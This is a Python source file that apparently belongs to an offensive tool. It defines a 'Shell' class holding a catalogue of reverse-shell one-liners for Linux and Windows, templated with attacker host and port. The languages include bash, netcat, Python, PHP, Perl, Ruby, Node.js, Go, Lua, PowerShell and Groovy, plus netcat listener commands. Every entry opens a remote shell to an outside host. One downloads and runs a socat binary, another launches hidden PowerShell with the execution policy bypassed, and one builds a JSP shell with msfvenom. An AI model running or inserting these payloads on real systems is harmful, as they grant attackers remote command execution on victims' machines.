class Shell(object):

    def __init__(self: object) -> None:
        self.listener: dict = {
            'tcp': 'rlwrap nc -lvvnp {lport}',
            'udp': 'rlwrap nc -u -lvvnp {lport}',
        }
        self.database: dict = {
            'linux': {
                'tcp': {
                    'awk': (
                        """awk 'BEGIN LEFTBRACKETs = "/inet/tcp/0/{lhost}>/{lport}"; while(42) LEFTBRACKET doLEFTBRACKET printf "shell>" |& s; s |& getline c; if(c)LEFTBRACKET while ((c |& getline) > 0) print $0 |& s; close(c); RIGHTBRACKET RIGHTBRACKET while(c != "exit") close(s); RIGHTBRACKETRIGHTBRACKET' /dev/null""",
                    ),
                    'bash': (
                        """/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1""",
                    ),
                    'go': (
                        """echo 'package main;import"os/exec";import"net";func main()LEFTBRACKETc,_:=net.Dial("tcp","{lhost}:{lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()RIGHTBRACKET' >| /tmp/.t.go && go run /tmp/.t.go && rm -f /tmp/.t.go""",
                    ),
                    'java': (
                        """r=Runtime.getRuntime();p=r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor()""",
                    ),
                    'lua': (
                        """lua -e "require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('/bin/sh -i <&3 >&3 2>&3');" """,
                        """lua5.1 -e 'local host, port = "{lhost}", {lport} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'""",
                    ),
                    'netcat': (
                        """rm -f /tmp/.g;mkfifo /tmp/.g;cat /tmp/.g|/bin/sh -i 2>&1|nc {lhost} {lport} &>/tmp/.g""",
                        """nc -e /bin/sh {lhost} {lport}""",
                        """ncat {lhost} {lport} -e /bin/sh""",
                    ),
                    'nodejs': (
                        """!function()LEFTBRACKETvar e=require("net"),n=require("child_process").spawn("/bin/sh",[]),i=new e.Socket;i.connect({lport},"{lhost}",function()LEFTBRACKETi.pipe(n.stdin),n.stdout.pipe(i),n.stderr.pipe(i)RIGHTBRACKET)RIGHTBRACKET();""",
                        """require('child_process').exec('nc -e /bin/sh {lhost} {lport}')""",
                    ),
                    'perl': (
                        """perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))LEFTBRACKETopen(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");RIGHTBRACKET;'""",
                    ),
                    'php': (
                        """php -r '$sock=fsockopen("{lhost}",{lport});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""",
                        """php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'""",
                        """php -r '$sock=fsockopen("{lhost}",{lport});shell_exec("/bin/sh -i <&3 >&3 2>&3");'""",
                        """php -r '$sock=fsockopen("{lhost}",{lport});`/bin/sh -i <&3 >&3 2>&3`;'""",
                        """php -r '$sock=fsockopen("{lhost}",{lport});system("/bin/sh -i <&3 >&3 2>&3");'""",
                        """php -r '$sock=fsockopen("{lhost}",{lport});passthru("/bin/sh -i <&3 >&3 2>&3");'""",
                        """php -r '$sock=fsockopen("{lhost}",{lport});popen("/bin/sh -i <&3 >&3 2>&3", "r");'""",
                    ),
                    'python': (
                        """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
                        """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/sh")'""",
                        """python -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'""",
                    ),
                    'ruby': (
                        """ruby -rsocket -e 'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
                        """ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{lhost}","{lport}");while(cmd=c.gets);IO.popen(cmd,"r")LEFTBRACKET|io|c.print io.readRIGHTBRACKETend'""",
                    ),
                    'socat': (
                        """wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat;/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}""",
                    ),
                    'war': (
                        """msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war > reverse.war""",
                    ),
                },
                'udp': {
                    'bash': (
                        """/bin/bash -i >& /dev/udp/{lhost}/{lport} 0>&1""",
                    ),
                    'netcat': (
                        """ncat --udp {lhost} {lport} -e /bin/sh""",
                    ),
                },
            },
            'windows': {
                'tcp': {
                    'groovy': (
                        """String host="{lhost}";int port={lport};String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())LEFTBRACKETwhile(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try LEFTBRACKETp.exitValue();break;RIGHTBRACKETcatch (Exception e)LEFTBRACKETRIGHTBRACKETRIGHTBRACKET;p.destroy();s.close();""",
                    ),
                    'lua': (
                        """lua5.1 -e 'local host, port = "{lhost}", {lport} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'""",
                    ),
                    'perl': (
                        """perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""",
                    ),
                    'powershell': (
                        """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%LEFTBRACKET0RIGHTBRACKET;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)LEFTBRACKET;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()RIGHTBRACKET;$client.Close()""",
                        """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%LEFTBRACKET0RIGHTBRACKET;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)LEFTBRACKET;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()RIGHTBRACKET;$client.Close()" """,
                    ),
                    'python': (
                        """C:\Python27\python.exe -c "(lambda __y,__g,__contextlib: [[[[[[[(s.connect(('{lhost}',{lport})),[[[(s2p_thread.start(),[[(p2s_thread.start(),(lambda __out: (lambda __ctx: [__ctx.__enter__(),__ctx.__exit__(None,None,None),__out[0](lambda: None)][2])(__contextlib.nested(type('except',(),LEFTBRACKET'__enter__': lambda self: None,'__exit__': lambda __self,__exctype,__value,__traceback: __exctype is not None and (issubclass(__exctype,KeyboardInterrupt) and [True for __out[0] in [((s.close(),lambda after: after())[1])]][0])RIGHTBRACKET)(),type('try',(),LEFTBRACKET'__enter__': lambda self: None,'__exit__': lambda __self,__exctype,__value,__traceback: [False for __out[0] in [((p.wait(),(lambda __after: __after()))[1])]][0]RIGHTBRACKET)())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s,args=[s,p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p,args=[s,p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE,stderr=subprocess.STDOUT,stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])(LEFTBRACKETRIGHTBRACKET),'p2s')]][0] for __g['s2p'],s2p.__name__ in [(lambda s,p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data'])>0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'],__l['p'] in [(s,p)]][0])(LEFTBRACKETRIGHTBRACKET),'s2p')]][0] for __g['os'] in [(__import__('os',__g,__g))]][0] for __g['socket'] in [(__import__('socket',__g,__g))]][0] for __g['subprocess'] in [(__import__('subprocess',__g,__g))]][0] for __g['threading'] in [(__import__('threading',__g,__g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))),globals(),__import__('contextlib'))" """,
                    ),
                    'ruby': (
                        """ruby -rsocket -e 'c=TCPSocket.new("{lhost}","{lport}");while(cmd=c.gets);IO.popen(cmd,"r")LEFTBRACKET|io|c.print io.readRIGHTBRACKETend'""",
                    ),
                }
            },
        }